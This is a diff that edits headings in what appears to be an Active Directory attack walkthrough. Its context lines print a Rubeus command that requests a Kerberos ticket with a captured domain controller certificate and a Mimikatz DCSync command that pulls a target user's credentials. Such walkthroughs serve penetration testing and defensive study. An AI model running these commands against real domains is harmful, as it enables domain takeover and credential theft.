@@ -61,7 +61,7 @@ A regular domain user with no special privileges.
 
 ![got-dc2-cert](got-dc2-cert.jpg)
 
-## 4. use Rubeus.exe on the windows machine to request a TGT for that account using the certificate
+## 4. use Rubeus on the windows machine to request a TGT for that account using the certificate
 
 `.\Rubeus.exe asktgt /outfile:kirbi /dc:<DOMAINCONTROLLER> /domain:<DOMAIN_FQDN> /user:<CAPTURED_DC_COMPUTER_ACCOUNT_NAME> /ptt /certificate:<CAPTURED_BASE64_CERTIFICATE>`
 
@@ -69,7 +69,7 @@ A regular domain user with no special privileges.
 
 ![got-dc2-tgt](got-dc2-tgt.jpg)
 
-## 5. *Having the TGT in memory,* use Mimikatz.exe to do a DCSync attack
+## 5. *Having the TGT in memory,* use Mimikatz to do a DCSync attack
 `lsadump::dcsync /domain:<DOMAINFQDN> /user:<TARGET_USER>`
 
 ![dcsync-for-domain-admin-hash](dcsync-for-domain-admin-hash.jpg)
